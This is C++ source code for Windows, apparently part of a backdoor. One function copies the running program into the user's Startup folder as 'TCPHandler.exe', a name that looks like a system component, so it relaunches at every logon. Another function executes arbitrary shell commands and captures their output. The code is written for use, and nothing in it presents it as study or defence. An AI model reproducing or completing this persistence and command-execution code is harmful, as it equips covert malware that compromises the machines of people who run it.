#include<iostream>
#include <windows.h>
#include <string>
#include <thread>
#include <windows.h>
#include <memory>
#include <stdexcept>
#include <array>
#include <fstream>
#define UNICODE
#include <AtlBase.h>  
#include <AtlCom.h>
#include <UIAutomation.h>
#include <atlstr.h>

int startUpMenu(char* filepath)
{
    const char* dst = "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\TCPHandler.exe"; // %APPDATA% is saved by windows,
                                                                                               //so the path is compatable for every computer
    WCHAR src[MAX_PATH] = { 0 };
    const char* filename = "TCPHandler.exe"; // the name of the file i put in the start menu
    std::string filePath(filepath);
    std::string fileName(filePath.substr(filePath.size() - 14, filePath.size()));   // i take the fixed size of the name i gave the file i put in the start menu

    std::cout << "file name: " << fileName.c_str() << std::endl;; // debug
    GetModuleFileName(NULL, src, MAX_PATH);

    if (strcmp(fileName.c_str(), filename) != 0) // here i check if the current running application isn't the one in the backgroung 
                                                // i do that by checking if the file's name equals the one i give it whe n i copy it to the startup directory
    {
        std::string copy = std::string("copy")
            + " \"" + std::string(CW2A(src)) + "\"" + " \"" + std::string(dst) + "\""; // I surround the path with " " 
                                                                                // in case the                              
        std::cout << copy.c_str() << std::endl;
        system(copy.c_str());

        return 0;
    }       // the return value tells the program if it should quit after this function or continue
    return 1;
}

const char* addSlesh(const char* str)
{
    char* ret = new char[1024]{ 0 };
    int i = 0;
    int j = 0;
    for (; str[i] != '\0'; i++, j++)
    {
        ret[j] = str[i];
        if (str[i] == '\\')
        {
            j++;
            ret[j] = '\\';
        }
    }
    return ret;
}

std::string exec(const char* cmd) {
    std::array<char, 128> buffer;
    std::string result;
    //std::cout << cmd << std::endl;
    std::unique_ptr<FILE, decltype(&_pclose)> pipe(_popen(cmd, "r"), _pclose); // i create a pointer to a "file"
    Sleep(100);                                                               // then i pipe the output to that "file"
    if (!pipe)
        throw std::runtime_error("popen() failed!");
    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) // I read the data from the buffer 
        result += buffer.data();
    // that contains the file data
    //std::cout << result << std::endl;
    return result;
}

